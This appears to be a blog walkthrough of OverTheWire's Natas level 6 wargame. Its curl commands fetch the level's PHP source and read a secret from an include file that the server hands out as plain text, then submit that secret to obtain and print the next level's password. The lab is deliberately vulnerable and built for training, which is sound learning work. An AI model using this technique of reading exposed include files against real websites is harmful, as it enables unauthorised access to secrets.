---
title: "Natas Level 6"
date: 2026-04-05T14:43:32-05:00
draft: false
toc: false
images:
tags:
  - security
  - natas
  - overthewire
  - curl
---

- **Username:** `natas6`
- **Password:** `0RoJwHdSKWFTYR5WuiAewauSuNaBXned`
- **URL:** <http://natas6.natas.labs.overthewire.org>

```bash
curl -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned http://natas6.natas.labs.overthewire.org
```

Body:

```html
<body>
<h1>natas6</h1>
<div id="content">
<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
```

There is a **POST** form asking for a secret, plus a **View sourcecode** link. The real logic is not on the main page, so pull **`index-source.html`** with the same basic auth.

A plain **`curl`** dump is still full HTML (`<br>`, tags, and whatever your terminal does for color), so it looked messy on my side. Piping through **`w3m`** renders it as readable text in the terminal:

```bash
curl -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned http://natas6.natas.labs.overthewire.org/index-source.html | w3m -T text/html
```

Relevant PHP:

```php
<?
include "includes/secret.inc";

if (array_key_exists("submit", $_POST)) {
    if ($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
}
?>
```

The comparison uses **`$secret`** from **`includes/secret.inc`**. That file is not PHP-executed when fetched as a static URL, so you can read it directly:

```bash
curl -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned http://natas6.natas.labs.overthewire.org/includes/secret.inc
```

```text
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

Submit that value as **`secret`** on the form. With **curl**, send **POST** data with **`-d`** (and keep **`-u`** for natas6):

```bash
curl -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned \
  -d "secret=FOEIUWGHFEEUHOFUOIU&submit=" \
  http://natas6.natas.labs.overthewire.org/
```

Body:

```html
<body>
<h1>natas6</h1>
<div id="content">
Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
```

The server compares your input to the included secret, matching strings grant access and print the next password.

**Password for natas7:** `bmg8SvU1LizuWjx3y7xkNERkHxGre0GS`
